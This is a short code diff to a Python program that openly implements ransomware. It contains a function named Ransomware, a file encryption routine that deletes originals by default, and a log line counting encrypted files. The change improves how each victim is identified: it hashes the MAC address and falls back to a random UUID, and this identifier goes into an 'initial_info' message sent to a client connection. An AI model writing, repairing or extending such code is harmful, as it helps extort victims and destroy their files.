@@ -9,6 +9,7 @@ import socket
 import platform
 import base64
 import logging
+import uuid
 
 from getmac import get_mac_address
 from cryptography.hazmat.primitives import hashes, serialization
@@ -287,9 +288,13 @@ def encrypt_file(file_path, delete_original=True):
 
 def Ransomware(directory_path, client):
     try:
-        mac = get_mac_address() or "unknown"
-        victim_id = hashlib.sha256(mac.encode()).hexdigest()
+        mac = get_mac_address()
 
+        if mac:
+            victim_id = hashlib.sha256(mac.encode()).hexdigest()
+        else:
+            victim_id = str(uuid.uuid4())
+        
         initial_data = {
             "type": "initial_info",
             "victim_id": victim_id,
@@ -360,4 +365,5 @@ def Ransomware(directory_path, client):
 
     logger.info(f"Proceso completado. Total archivos cifrados: {count}")
     return count
+
 
